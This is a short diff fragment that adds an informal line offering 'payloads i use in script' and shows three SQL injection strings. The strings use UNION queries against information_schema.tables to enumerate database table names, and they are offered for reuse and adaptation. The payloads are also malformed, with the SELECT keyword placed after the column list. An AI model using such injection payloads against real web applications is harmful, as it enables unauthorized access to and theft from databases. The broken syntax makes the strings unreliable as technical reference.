@@ -1,3 +1,4 @@
+here some payloads i use in script you can change to be more affective with you :<br/>
 'UNION table_name,NULL SELECT FROM information_schema.tables--",
 'UNION NULL,table_name SELECT FROM information_schema.tables--",
 'UNION table_name,NULL SELECT FROM information_schema.tables #",	
